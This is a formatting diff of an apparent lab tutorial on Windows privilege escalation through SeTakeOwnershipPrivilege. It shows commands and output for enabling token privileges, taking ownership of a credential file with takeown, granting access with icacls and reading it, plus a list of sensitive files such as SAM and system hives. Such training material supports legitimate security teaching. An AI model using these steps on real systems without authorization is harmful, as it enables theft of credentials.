@@ -24,8 +24,7 @@ Suppose we encounter a user with this privilege or assign it to them through an 
 
 Let's review our current user's privileges.
 
-```
-        powershell
+```powershell
 PS C:\htb> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -42,8 +41,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set                    
 
 Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module .\Enable-Privilege.ps1
 PS C:\htb> .\EnableAllTokenPrivs.ps1
 PS C:\htb> whoami /priv
@@ -67,8 +65,7 @@ Note: Take great care when performing a potentially destructive action like chan
 
 Let's check out our target file to gather a bit more information about it.
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
  
 FullName                                 LastWriteTime         Attributes Owner
@@ -80,8 +77,7 @@ C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
 
 We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.
 
-```
-        powershell
+```powershell
 PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
 
  Volume in drive C has no label.
@@ -102,8 +98,7 @@ We can see that the IT share appears to be owned by a service account and does c
 
 Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.
 
-```
-        powershell
+```powershell
 PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
  
 SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
@@ -113,8 +108,7 @@ SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now ow
 
 We can confirm ownership using the same command as before. We now see that our user account is the file owner.
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
  
 Name     Directory                       Owner
@@ -126,8 +120,7 @@ cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
 
 We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.
 
-```
-        powershell
+```powershell
 PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
 
 cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
@@ -141,8 +134,7 @@ At line:1 char:1
 
 Let's grant our user full privileges over the target file.
 
-```
-        powershell
+```powershell
 PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
 
 processed file: C:\Department Shares\Private\IT\cred.txt
@@ -153,8 +145,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 If all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass database.
 
-```
-        powershell
+```powershell
 PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
 
 NIX01 admin
@@ -172,8 +163,7 @@ After performing these changes, we would want to make every effort to revert the
 
 Some local files of interest may include:
 
-```
-        shellsession
+```shellsession
 c:\inetpub\wwwwroot\web.config
 %WINDIR%\repair\sam
 %WINDIR%\repair\system
